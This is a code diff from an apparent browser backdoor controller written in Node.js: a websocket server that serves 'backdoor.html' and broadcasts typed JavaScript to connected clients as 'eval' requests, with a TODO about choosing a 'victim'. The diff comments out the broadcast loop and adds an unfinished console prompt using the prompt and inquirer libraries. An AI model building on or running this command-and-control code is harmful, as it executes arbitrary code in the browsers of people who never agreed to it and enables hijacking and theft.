@@ -5,6 +5,7 @@
 var WebSocketServer = require('websocket').server
 var webSocketsServerPort = 1337
 var fs = require('fs');
+var inquirer = require('inquirer');
 var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
 var http = require('http')
 var conns = []
@@ -124,10 +125,45 @@ var stdin = process.openStdin();
 //TODO list help en start here (make function to be recalled)
 console.log("");
 console.log("Typed javascript-commands will be sent to all connected clients");
+
+/*
 stdin.addListener("data", function(d) {
 	var command = d.toString().trim();
 	//TODO TEMP SEND TO ALL -> later make layers and choose victim (not like this)
 	for (var i in conns)
 		conns[i].sendUTF(JSON.stringify({ request: 'eval', content: command }))
 	console.log("COMMAND SENT: "+command);
+});
+*/
+
+/*
+inquirer([{name: 'command', message: '>>>'}], function(answers){
+
+	 console.log(answers); //an object containing the user response.
+
+});
+*/
+/*
+function input() {
+	inquirer.prompt([{name: 'command', message: '>>>'}]).then(answers => {
+		 console.log(answers); //an object containing the user response.
+		//repeat
+		input();
+	});
+}
+*/
+var prompt = require('prompt');
+prompt.message = "";
+prompt.delimiter = "";
+
+ var colors = require("colors/safe");
+
+// Start the prompt
+prompt.start();
+
+//
+// Get two properties from the user: username and email
+//
+prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
+  console.log('command: ' + result.command);
 });
